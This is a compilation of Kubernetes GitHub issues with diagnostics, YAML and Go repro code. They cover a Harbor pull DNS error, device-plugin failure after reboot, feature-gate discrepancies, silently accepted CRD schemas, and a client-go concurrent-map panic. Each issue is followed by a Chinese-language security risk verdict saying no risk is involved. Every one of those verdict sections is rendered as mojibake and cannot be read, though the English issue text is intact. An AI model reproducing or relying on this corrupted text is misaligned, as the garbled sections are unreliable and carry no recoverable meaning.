â”‚ Warning   Failed     10m (x4 over 13m)     kubelet            Failed to pull image "harbor.harbor.svc.cluster.local:80/hello-world:0.0.0": Error response from daemon: Get "https://harbor.harbor.svc.cluster.local:80/v2/": dial tcp: lookup harbor.harbor.svc.cluster.local: â”‚
â”‚                                                             Temporary failure in name resolution                                                                                                                                                 â”‚
```

Here is my deployment.yaml
```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: hello-world-build
  namespace: default
spec:
  replicas: 1
  selector:
    matchLabels:
      app: hello-world-build
  template:
    metadata:
      labels:
        app: hello-world-build
    spec:
      containers:
      - env:
        - name: DOCKER_CONFIG
          value: /.docker
        image: harbor.harbor.svc.cluster.local:80/hello-world:0.0.0
        imagePullPolicy: IfNotPresent
        name: hello-world
        ports:
        - containerPort: 8000
          protocol: TCP
        volumeMounts:
        - mountPath: /.docker
          name: build-registry-secret
      volumes:
      - name: build-registry-secret
        secret:
          defaultMode: 420
          secretName: build-registry-creds
```

#### What did you expect to happen?

I expect the pull to work. At the very least if it's something to do with HTTP vs HTTPs I expect that to be the error message, not that TCP lookup fails, since my pushes are working using the kaniko job.

#### How can we reproduce it (as minimally and precisely as possible)?

See the description above. (I don't hink you need harbor, just any registry deployed using clusterIP

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.31.0
```

</details>


#### Cloud provider

<details>
None, using minikube
</details>


#### OS version

<details>

```console
MacOS:
Darwin XXX.local 23.1.0 Darwin Kernel Version 23.1.0: Mon Oct  9 21:33:00 PDT 2023; root:xnu-10002.41.9~7/RELEASE_ARM64_T6031 arm64
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨Kubernetesä¸­ä½¿ç”¨Harborç§æœ‰ä»“åº“æ—¶ï¼Œæ‹‰å–é•œåƒå¤±è´¥çš„é—®é¢˜ã€‚æ ¹æ®é”™è¯¯ä¿¡æ¯`dial tcp: lookup harbor.harbor.svc.cluster.local: Temporary failure in name resolution`ï¼Œè¿™æ˜¯ä¸€ä¸ªDNSè§£æå¤±è´¥çš„é—®é¢˜ï¼Œå¯èƒ½æ˜¯ç”±äºé›†ç¾¤å†…éƒ¨DNSé…ç½®ä¸æ­£ç¡®æˆ–æš‚æ—¶æ€§æ•…éšœå¼•èµ·çš„ã€‚æ­¤å¤–ï¼Œé”™è¯¯ä¸­æåˆ°`Get "https://harbor.harbor.svc.cluster.local:80/v2/"`ï¼Œè¡¨æ˜å®¢æˆ·ç«¯å°è¯•é€šè¿‡HTTPSåè®®åœ¨ç«¯å£80ä¸Šè®¿é—®ä»“åº“ï¼Œè¿™å¯èƒ½æ˜¯åè®®æˆ–ç«¯å£é…ç½®ä¸åŒ¹é…å¯¼è‡´çš„é—®é¢˜ã€‚æ€»ä½“æ¥çœ‹ï¼Œè¿™å±äºé…ç½®é”™è¯¯æˆ–ä½¿ç”¨é”™è¯¯ï¼Œå¹¶ä¸æ¶‰åŠæ”»å‡»è€…å¯åˆ©ç”¨çš„å®‰å…¨é£é™©ï¼Œä¹Ÿæ²¡æœ‰å¯¼è‡´ä»»ä½•å®‰å…¨æ¼æ´ã€‚

---

## Issue #128043 Pods that consume "devices" via Device Plugin always fail when Node reboots even if it implements `plugins_registry` interface

- Issue é“¾æ¥ï¼š[#128043](https://github.com/kubernetes/kubernetes/issues/128043)

### Issue å†…å®¹

#### What happened?

When node reboots, Pods that consume **devices** via Device Plugin always fail.

Even if I implement device plugin with ability to use `/var/lib/kubelet/plugins_registry` directory, it fails too.

Below is my flow of inspection to understand current implementation of `kubelet` related to the device plugin interface.

***

I tested below cases:
- Only `kubelet` restarts
- Only `containerd` restarts
- Both `kubelet` and `containerd` restart

All of 3 cases do not make any error. It only happens when node reboots.

***

Device Health status is provided using `healthDevices`.
- [When `kubelet` starts, it restores from checkpoint, but both `healthDevices` and `unhealthyDevices` set to empty set.](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/cm/devicemanager/manager.go#L506-L532)
- [`healthyDevices` will be supplied through this code block.](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/cm/devicemanager/manager.go#L259-L318)
    - Right now, there is no other code block that supplies `healthyDevices`.

About Device Plugin Registration
- [Device Plugin can be registered to `kubelet` through this code block.](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/cm/devicemanager/plugin/v1beta1/handler.go#L41-L44)
    - Plugin sends request to `kubelet`.
- After registration, dedicated client will be created and [run at another goroutine](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/cm/devicemanager/plugin/v1beta1/handler.go#L78-L80).
- [As I mentioned above, `healthyDevices` can only be injected through this code block](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/cm/devicemanager/manager.go#L271-L318).
    - However, initialization always happens at the beginning of this code block.
- To summarize it, **there is no way to supply health devices before device plugin registration**.

***

About `PluginManager` and `plugins_registry`
> `pluginmanager` runs a set of asynchronous loops that figure out which plugins need to be registered/unregistered based on this node and makes it so.
- [`plugins_registry` is used at `PluginManager`. The first usage can be found here](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/kubelet.go#L848-L851).
- [In `PluginManager`, registration of Device Plugin watcher (NOT the DEVICE PLUGIN) happens.](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/kubelet.go#L1581-L1582)
    - [For device plugin, this code block implements Device Plugin watcher interface.](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/cm/devicemanager/plugin/v1beta1/server.go#L40-L45)
- [After registration of watcher, `PluginManager` runs.](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/pluginmanager/plugin_manager.go#L108-L124)
    - Inside that code block, we can find `go pm.reconciler.Run(stopCh)`. We can jump to [this section](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/pluginmanager/reconciler/reconciler.go#L85-L91).
- [In the `reconcile()`](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/pluginmanager/reconciler/reconciler.go#L111-L165), it syncs `desiredStateOfWorld` and `actualStateOfWorld`.
- [In this code block, all unix sockets exist in the `/var/lib/kubelet/plugins_registry` are managed through `AddOrUpdatePlugin()` method.](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/pluginmanager/pluginwatcher/plugin_watcher.go#L187-L200)

All of above steps are executed BEFORE entering `syncLoop()`.

***

So my thought was, If I implement device plugin to deal with `plugins_registry`, it can be registered to `kubelet` before other pod run.
- [`GetInfo(...)`](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/pluginmanager/operationexecutor/operation_generator.go#L91) and [`NotifyRegistrationStatus(...)`](https://github.com/kubernetes/kubernetes/blob/release-1.31/pkg/kubelet/pluginmanager/operationexecutor/operation_generator.go#L166) GRPC interface have to be implemented.

However, even if I implemented above things, same problem happens.
- When node reboots, all containers are in stopped state.
- `kubelet` is in charge of re-run stopped containers in that node.
- Before entering `syncLoop()`, 2 GRPC interface will be called.
    - However, because device plugin pod is in stopped state, above GRPC call fails.
    - Due to failure of above GRPC call, device plugin registration before entering `syncLoop()` also fails too.

To solve this problem, I have to run the device plugin using other method (e.g. systemd daemon), that can't be managed by kubelet.

#### What did you expect to happen?

To be honest, I know the current problem but don't know the nice solution.

#### How can we reproduce it (as minimally and precisely as possible)?

Prepare device plugin (e.g. [`NVIDIA/k8s-device-plugin`](https://github.com/NVIDIA/k8s-device-plugin)) and run any Pod consumes that device (e.g. NVIDIA GPU).

After Pod successfully created and run without any problem, DO node reboot (e.g. just type `sudo reboot`).

After node reboots, you can see error message like below.
```
Allocate failed due to no healthy devices present; cannot allocate unhealthy devices nvidia.com/gpu, which is unexpected
```

#### Anything else we need to know?

This issue has been discussed in [this Slack thread](https://kubernetes.slack.com/archives/C0BP8PW9G/p1709610711920639).


#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.4
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.5
```

</details>


#### Cloud provider

<details>
Bare Metal
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.5 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.5 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

$ uname -a
Linux MS03-CEO-008 6.8.0-45-generic #45~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC Wed Sep 11 15:25:05 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>
kubeadm version: &version.Info{Major:"1", Minor:"30", GitVersion:"v1.30.5", GitCommit:"74e84a90c725047b1328ff3d589fedb1cb7a120e", GitTreeState:"clean", BuildDate:"2024-09-12T00:17:07Z", GoVersion:"go1.22.6", Compiler:"gc", Platform:"linux/amd64"}
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd containerd.io 1.7.22 7f7fdf5fed64eb6a7caf99b3e12efcf9d60e311c
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¿™ä»½Issueæè¿°äº†åœ¨Kubernetesä¸­ï¼Œå½“èŠ‚ç‚¹é‡å¯æ—¶ï¼Œä½¿ç”¨Device Pluginæ¶ˆè´¹è®¾å¤‡çš„Podä¼šå¤±è´¥çš„é—®é¢˜ã€‚å³ä½¿å®ç°äº†`plugins_registry`æ¥å£ï¼Œé—®é¢˜ä¾ç„¶å­˜åœ¨ã€‚

é€šè¿‡åˆ†æï¼ŒåŸå› åœ¨äºï¼š

- èŠ‚ç‚¹é‡å¯åï¼ŒDevice Plugin Podå¤„äºåœæ­¢çŠ¶æ€ï¼Œkubeletåœ¨è¿›å…¥`syncLoop()`ä¹‹å‰æ— æ³•æˆåŠŸæ³¨å†ŒDevice Pluginã€‚
- ç”±äºDevice Pluginæœªæ³¨å†Œï¼Œ`healthyDevices`æ— æ³•è¢«æ­£ç¡®åŠ è½½ï¼Œå¯¼è‡´Podæ— æ³•åˆ†é…åˆ°è®¾å¤‡ã€‚
- è§£å†³æ–¹æ³•æ˜¯å°†Device Pluginä»¥kubeletç®¡ç†ä¹‹å¤–çš„æ–¹å¼è¿è¡Œï¼Œä¾‹å¦‚åˆ©ç”¨systemdå®ˆæŠ¤è¿›ç¨‹ã€‚

æ ¹æ®ä»¥ä¸Šåˆ†æï¼Œè¿™ä¸ªIssueå±äºåŠŸèƒ½æ€§é—®é¢˜ï¼Œæ˜¯Device Pluginåœ¨èŠ‚ç‚¹é‡å¯åçš„æ¢å¤æœºåˆ¶ä¸å®Œå–„å¯¼è‡´çš„ï¼Œå¹¶æœªæ¶‰åŠåˆ°å®‰å…¨é£é™©ã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼š

1. **è¯¥é£é™©èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨**ï¼šæ­¤é—®é¢˜å±äºkubeletä¸Device Pluginä¹‹é—´çš„äº¤äº’é—®é¢˜ï¼Œæ— æ³•è¢«æ”»å‡»è€…åˆ©ç”¨ã€‚
2. **è¯¥é£é™©æœ‰å¯èƒ½æˆä¸ºä¸€ä¸ªæ¼æ´ï¼Œå¹¶è¢«åˆ†é…CVEç¼–å·ï¼Œä½¿ç”¨CVSS 3.1è¯„åˆ†æ ‡å‡†æ‰“åˆ†ï¼Œç»“æœè¦åœ¨highä»¥ä¸Š**ï¼šä¸ç¬¦åˆã€‚
3. **Issueæäº¤è€…åœ¨æäº¤å†…å®¹ä¸­æš´éœ²çš„æ•æ„Ÿä¿¡æ¯ã€ä¸å½“æ“ä½œã€ä¸å½“é…ç½®ç­‰é—®é¢˜ï¼Œä¸å±äºå®‰å…¨é£é™©**ã€‚
4. **é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€**ã€‚

å› æ­¤ï¼Œåˆ¤å®šæ­¤Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128036 Kubernetes Compatibility Versions: Feature Gate Discrepency when comparing HEAD w/ --emulated-version=1.31 w/ branch:`v1.31.1` branch (K8s release v1.31.1)

- Issue é“¾æ¥ï¼š[#128036](https://github.com/kubernetes/kubernetes/issues/128036)

### Issue å†…å®¹

#### What happened?

I am seeing a discrepancy in values comparing the feature gates of  HEAD w/ --emulated-version=1.31 (HEAD as of 10/12/2024) w/ branch:`v1.31.1` branch:

The feature gate values below were captured by running the hack/local-up-cluster.sh script and hitting the /metrics endpoint.

- HEAD w/ --emulated-version=1.31: 
```bash
$ EMULATED_VERSION=1.31 sudo -E hack/local-up-cluster.sh
...
$ kubectl --kubeconfig=/var/run/kubernetes/admin.kubeconfig get --raw /metrics | grep kubernetes_feature_enabled &> ~/out.txt
...
```
  - https://gist.github.com/aaron-prindle/3124f38817db18381336dc0fe0fcd879
- 1.31.1 release:
```bash
sudo hack/local-up-cluster.sh
...
$ kubectl --kubeconfig=/var/run/kubernetes/admin.kubeconfig get --raw /metrics | grep kubernetes_feature_enabled &> ~/out.txt
...
```
  - https://gist.github.com/aaron-prindle/90f54bb25e90d7bff8a8a25c727b22fe

Diff of the feature gates:
```diff
aprindle@aprindle-ssd ~/ft-gate-diffs/actual diff -u 1.31.1-release.txt HEAD-w-1.31-emulation-10-12-2024.txt 
--- 1.31.1-release.txt	2024-10-13 03:48:20.047411576 +0000
+++ HEAD-w-1.31-emulation-10-12-2024.txt	2024-10-13 22:35:59.973302704 +0000
@@ -11,7 +11,6 @@
 kubernetes_feature_enabled{name="AllBeta",stage="BETA"} 0
 kubernetes_feature_enabled{name="AllowDNSOnlyNodeCSR",stage="DEPRECATED"} 0
 kubernetes_feature_enabled{name="AllowInsecureKubeletCertificateSigningRequests",stage="DEPRECATED"} 0
-kubernetes_feature_enabled{name="AllowServiceLBStatusOnNonLB",stage="DEPRECATED"} 0
 kubernetes_feature_enabled{name="AnonymousAuthConfigurableEndpoints",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="AnyVolumeDataSource",stage="BETA"} 1
 kubernetes_feature_enabled{name="AppArmor",stage=""} 1
@@ -26,10 +25,8 @@
 kubernetes_feature_enabled{name="CSIMigrationPortworx",stage="BETA"} 1
 kubernetes_feature_enabled{name="CSIVolumeHealth",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="CloudControllerManagerWebhook",stage="ALPHA"} 0
-kubernetes_feature_enabled{name="CloudDualStackNodeIPs",stage=""} 1
 kubernetes_feature_enabled{name="ClusterTrustBundle",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="ClusterTrustBundleProjection",stage="ALPHA"} 0
-kubernetes_feature_enabled{name="ComponentSLIs",stage="BETA"} 1
 kubernetes_feature_enabled{name="ConcurrentWatchObjectDecode",stage="BETA"} 0
 kubernetes_feature_enabled{name="ConsistentListFromCache",stage="BETA"} 1
 kubernetes_feature_enabled{name="ContainerCheckpoint",stage="BETA"} 1
@@ -66,8 +63,6 @@
 kubernetes_feature_enabled{name="JobPodReplacementPolicy",stage="BETA"} 1
 kubernetes_feature_enabled{name="JobSuccessPolicy",stage="BETA"} 1
 kubernetes_feature_enabled{name="KMSv1",stage="DEPRECATED"} 0
-kubernetes_feature_enabled{name="KMSv2",stage=""} 1
-kubernetes_feature_enabled{name="KMSv2KDF",stage=""} 1
 kubernetes_feature_enabled{name="KubeProxyDrainingTerminatingNodes",stage=""} 1
 kubernetes_feature_enabled{name="KubeletCgroupDriverFromCRI",stage="BETA"} 1
 kubernetes_feature_enabled{name="KubeletInUserNamespace",stage="ALPHA"} 0
@@ -75,7 +70,6 @@
 kubernetes_feature_enabled{name="KubeletPodResourcesGet",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="KubeletSeparateDiskGC",stage="BETA"} 1
 kubernetes_feature_enabled{name="KubeletTracing",stage="BETA"} 1
-kubernetes_feature_enabled{name="LegacyServiceAccountTokenCleanUp",stage=""} 1
 kubernetes_feature_enabled{name="LoadBalancerIPMode",stage="BETA"} 1
 kubernetes_feature_enabled{name="LocalStorageCapacityIsolationFSQuotaMonitoring",stage="BETA"} 0
 kubernetes_feature_enabled{name="LogarithmicScaleDown",stage=""} 1
@@ -86,14 +80,11 @@
 kubernetes_feature_enabled{name="MaxUnavailableStatefulSet",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="MemoryManager",stage="BETA"} 1
 kubernetes_feature_enabled{name="MemoryQoS",stage="ALPHA"} 0
-kubernetes_feature_enabled{name="MinDomainsInPodTopologySpread",stage=""} 1
 kubernetes_feature_enabled{name="MultiCIDRServiceAllocator",stage="BETA"} 0
 kubernetes_feature_enabled{name="MutatingAdmissionPolicy",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="NFTablesProxyMode",stage="BETA"} 1
-kubernetes_feature_enabled{name="NewVolumeManagerReconstruction",stage=""} 1
 kubernetes_feature_enabled{name="NodeInclusionPolicyInPodTopologySpread",stage="BETA"} 1
 kubernetes_feature_enabled{name="NodeLogQuery",stage="BETA"} 0
-kubernetes_feature_enabled{name="NodeOutOfServiceVolumeDetach",stage=""} 1
 kubernetes_feature_enabled{name="NodeSwap",stage="BETA"} 1
 kubernetes_feature_enabled{name="OpenAPIEnums",stage="BETA"} 1
 kubernetes_feature_enabled{name="PDBUnhealthyPodEvictionPolicy",stage=""} 1
@@ -124,8 +115,6 @@
 kubernetes_feature_enabled{name="SchedulerQueueingHints",stage="BETA"} 0
 kubernetes_feature_enabled{name="SeparateCacheWatchRPC",stage="BETA"} 1
 kubernetes_feature_enabled{name="SeparateTaintEvictionController",stage="BETA"} 1
-kubernetes_feature_enabled{name="ServerSideApply",stage=""} 1
-kubernetes_feature_enabled{name="ServerSideFieldValidation",stage=""} 1
 kubernetes_feature_enabled{name="ServiceAccountTokenJTI",stage="BETA"} 1
 kubernetes_feature_enabled{name="ServiceAccountTokenNodeBinding",stage="BETA"} 1
 kubernetes_feature_enabled{name="ServiceAccountTokenNodeBindingValidation",stage="BETA"} 1
@@ -133,7 +122,6 @@
 kubernetes_feature_enabled{name="ServiceTrafficDistribution",stage="BETA"} 1
 kubernetes_feature_enabled{name="SidecarContainers",stage="BETA"} 1
 kubernetes_feature_enabled{name="SizeMemoryBackedVolumes",stage="BETA"} 1
-kubernetes_feature_enabled{name="StableLoadBalancerNodeSet",stage=""} 1
 kubernetes_feature_enabled{name="StatefulSetAutoDeletePVC",stage="BETA"} 1
 kubernetes_feature_enabled{name="StatefulSetStartOrdinal",stage=""} 1
 kubernetes_feature_enabled{name="StorageNamespaceIndex",stage="BETA"} 1
@@ -154,7 +142,6 @@
 kubernetes_feature_enabled{name="UnknownVersionInteroperabilityProxy",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="UserNamespacesPodSecurityStandards",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="UserNamespacesSupport",stage="BETA"} 0
-kubernetes_feature_enabled{name="ValidatingAdmissionPolicy",stage=""} 1
 kubernetes_feature_enabled{name="VolumeAttributesClass",stage="BETA"} 0
 kubernetes_feature_enabled{name="VolumeCapacityPriority",stage="ALPHA"} 0
 kubernetes_feature_enabled{name="WatchBookmark",stage=""} 1
```


The check here was done as part of https://github.com/kubernetes/kubernetes/issues/127947 as I was seeing some discrepencies in the feature gates when writing an integration test and wanted to understand a bit more if this is expected and what deltas are expected/allowed.  

#### What did you expect to happen?

I expected the feature gates to be identical

#### How can we reproduce it (as minimally and precisely as possible)?

Get the feature gate values for `HEAD` and `v1.31.1` by running the hack/local-up-cluster.sh script and hitting the /metrics endpoint for both.  Then compare the `kubernetes_feature_enabled` values:


`HEAD` w/ --emulated-version=1.31
```bash
$ EMULATED_VERSION=1.31 sudo -E hack/local-up-cluster.sh
...
$ kubectl --kubeconfig=/var/run/kubernetes/admin.kubeconfig get --raw /metrics | grep kubernetes_feature_enabled &> ~/out.txt
...
```

`v1.31.1`
```bash
$ sudo hack/local-up-cluster.sh
...
$ kubectl --kubeconfig=/var/run/kubernetes/admin.kubeconfig get --raw /metrics | grep kubernetes_feature_enabled &> ~/out.txt
...
```


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.31.0
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†åœ¨ä½¿ç”¨`--emulated-version=1.31`è¿è¡ŒHEADæ—¶ï¼Œå¾—åˆ°çš„feature gateçŠ¶æ€ä¸v1.31.1åˆ†æ”¯è¿è¡Œæ—¶çš„feature gateçŠ¶æ€å­˜åœ¨å·®å¼‚ã€‚æŠ¥å‘Šè€…é€šè¿‡æ¯”è¾ƒ`/metrics`ç«¯ç‚¹ä¸­çš„`kubernetes_feature_enabled`æŒ‡æ ‡ï¼Œå‘ç°äº†ä¸€äº›feature gatesåœ¨ä¸¤ç§æƒ…å†µä¸‹çš„å¯ç”¨çŠ¶æ€ä¸ä¸€è‡´ã€‚

ä»æä¾›çš„diffä¸­ï¼Œå¯ä»¥çœ‹åˆ°åœ¨HEADç‰ˆæœ¬ä¸­ï¼Œä¸€äº›feature gatesä¸å­˜åœ¨æˆ–çŠ¶æ€ä¸åŒã€‚è¿™å¯èƒ½æ˜¯ç”±äºHEADç‰ˆæœ¬çš„ä»£ç å˜åŠ¨å¯¼è‡´çš„ï¼Œåœ¨ä½¿ç”¨`--emulated-version`æ—¶æ²¡æœ‰æ­£ç¡®åœ°æ¨¡æ‹Ÿæ‰€æœ‰feature gateã€‚

ç„¶è€Œï¼Œä»å®‰å…¨è§’åº¦æ¥çœ‹ï¼ŒIssueä¸­å¹¶æœªæåŠä»»ä½•æ¶‰åŠé«˜é£é™©å®‰å…¨é—®é¢˜çš„å†…å®¹ï¼Œä¹Ÿæ²¡æœ‰æåˆ°ä»»ä½•ç‰¹å®šçš„feature gateå·®å¼‚å¯èƒ½å¯¼è‡´çš„å®‰å…¨æ¼æ´ã€‚Issueä¸»è¦å…³æ³¨åœ¨ä¸åŒç‰ˆæœ¬ä¹‹é—´feature gateå¯ç”¨çŠ¶æ€çš„ä¸ä¸€è‡´æ€§ï¼Œæ²¡æœ‰å‘ç°æœ‰å¯è¢«æ”»å‡»è€…åˆ©ç”¨çš„å®‰å…¨é£é™©ã€‚

å› æ­¤ï¼Œæ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œè®¤ä¸ºè¯¥Issueä¸æ¶‰åŠå®‰å…¨é£é™©ã€‚

---

## Issue #128033 In a CRD's schema, invalid schemas for array elements are accepted

- Issue é“¾æ¥ï¼š[#128033](https://github.com/kubernetes/kubernetes/issues/128033)

### Issue å†…å®¹

#### What happened?

I accidentally wrote an invalid OpenAPI v3.0 schema for the elements of an array in a CRD's schema. `kubectl create --validate=strict` accepted my CRD definition without complaint, and silently discarded my invalid schema property. I have attached two files that demonstrate the problem. test1.yaml.txt gets rejected, while test2.yaml.txt is accepted but the `{propertyNames: {pattern: foo}}` gets silently transformed to `{}`.

[test2.yaml.txt](https://github.com/user-attachments/files/17356492/test2.yaml.txt)

[test1.yaml.txt](https://github.com/user-attachments/files/17356493/test1.yaml.txt)



#### What did you expect to happen?

I expected my schema to be implemented or rejected.

#### How can we reproduce it (as minimally and precisely as possible)?

Shown above.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.29.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.2
```

</details>


#### Cloud provider

<details>
none
</details>


#### OS version

<details>

MacOS 15.0.1
container runtime is docker in Rancher Desktop.
Inside the VM guest, `/etc/os-release` says:

```
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.20.3
PRETTY_NAME="Alpine Linux v3.20"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://gitlab.alpinelinux.org/alpine/aports/-/issues"
BUILD_ID="v0.2.39.rd4"
VARIANT_ID="rd"
```

</details>


#### Install tools

<details>
kind v0.22.0
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
docker in Rancher Desktop; client v27.2.1-rd; server engine 26.1.5, containerd v1.7.17, runc 1.1.14, docker-init 0.19.0
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨CRDçš„schemaä¸­ï¼Œæ•°ç»„å…ƒç´ çš„æ— æ•ˆschemaè¢«æ¥å—ï¼Œ`kubectl create --validate=strict` æœªç»™å‡ºè­¦å‘Šæˆ–é”™è¯¯ï¼Œè€Œæ˜¯é»˜é»˜åœ°ä¸¢å¼ƒäº†æ— æ•ˆçš„schemaå±æ€§ã€‚æ ¹æ®æä¾›çš„ä¿¡æ¯ï¼Œè¿™å¯èƒ½å¯¼è‡´ç”¨æˆ·çš„CRDå®šä¹‰æœªæŒ‰ç…§é¢„æœŸå·¥ä½œï¼Œä½†è¿™å±äºåŠŸèƒ½æ€§é—®é¢˜ï¼Œè€Œéå®‰å…¨é£é™©ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬6æ¡ï¼Œæ­¤Issueä¸æ¶‰åŠå®‰å…¨é—®é¢˜ã€‚

---

## Issue #128017 with transform and resync, you may get concurrent map read/iteration or concurrent write panic easily

- Issue é“¾æ¥ï¼š[#128017](https://github.com/kubernetes/kubernetes/issues/128017)

### Issue å†…å®¹

#### What happened?

If you are setting none zero resync time and transform func to write annotations or labels, you may get `fatal error: concurrent map iteration and map write` panic easily. 


#### What did you expect to happen?

This kind of bug is hard to find. I wonder if there is something can be done in client-go to prevent developers from falling into the trap.

#### How can we reproduce it (as minimally and precisely as possible)?

Run the following code a while, it panics with `fatal error: concurrent map iteration and map write`

```
package main

import (
	"flag"
	"fmt"
	"time"

	corev1 "k8s.io/api/core/v1"
	"k8s.io/apimachinery/pkg/api/meta"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/labels"
	"k8s.io/apimachinery/pkg/util/runtime"
	"k8s.io/client-go/informers"
	"k8s.io/client-go/kubernetes/fake"
	"k8s.io/client-go/tools/cache"
	"k8s.io/klog/v2"
)

func main() {
	klog.InitFlags(nil)
	flag.Parse()
	defer klog.Flush()
	pod := &corev1.Pod{
		TypeMeta:   metav1.TypeMeta{Kind: "Pod", APIVersion: "v1"},
		ObjectMeta: metav1.ObjectMeta{Name: "foo", Namespace: "default", Annotations: map[string]string{"a": "b"}}}
	client := fake.NewSimpleClientset(pod)
	factory := informers.NewSharedInformerFactoryWithOptions(client, time.Millisecond*100,
		informers.WithTransform(func(obj interface{}) (interface{}, error) {
			if accessor, err := meta.Accessor(obj); err == nil {
				klog.Infof("transform pod %s", accessor.GetName())
				if accessor.GetAnnotations() != nil {
					delete(accessor.GetAnnotations(), "a1")
				}
			}
			return obj, nil
		}))
	if _, err := factory.Core().V1().Pods().Informer().AddEventHandler(cache.ResourceEventHandlerFuncs{
		AddFunc: func(obj interface{}) {
			pod, ok := obj.(*corev1.Pod)
			if !ok {
				return
			}
			klog.Infof("add pod %s", pod.Name)
		},
		UpdateFunc: func(oldObj, newObj interface{}) {
			newPod := newObj.(*corev1.Pod)
			// We use periodic resync to do consistency check so do not check the equity of ResourceVersion here.
			klog.Infof("update pod %s", newPod.Name)
		},
		DeleteFunc: func(obj interface{}) {
			pod, ok := obj.(*corev1.Pod)
			// When a delete is dropped, the relist will notice a pod in the store not
			// in the list, leading to the insertion of a tombstone object which contains
			// the deleted key/value. Note that this value might be stale.
			if !ok {
				tombstone, ok := obj.(cache.DeletedFinalStateUnknown)
				if !ok {
					runtime.HandleError(fmt.Errorf("couldn't get object from tombstone %+v", obj))
					return
				}
				pod, ok = tombstone.Obj.(*corev1.Pod)
				if !ok {
					runtime.HandleError(fmt.Errorf("tombstone contained object that is not a pod %+v", obj))
					return
				}
			}
			klog.Infof("delete pod %s", pod.Name)
		},
	}); err != nil {
		klog.Fatal(err)
	}
	go func() {
		for {
			pods, err := factory.Core().V1().Pods().Lister().Pods(metav1.NamespaceAll).List(labels.Everything())
			if err != nil {
				klog.Fatal(err)
			}
			for _, pod := range pods {
				for k, v := range pod.Annotations {
					klog.V(3).Infof("pod k, v: %s=%s", k, v)
				}
			}
		}
	}()
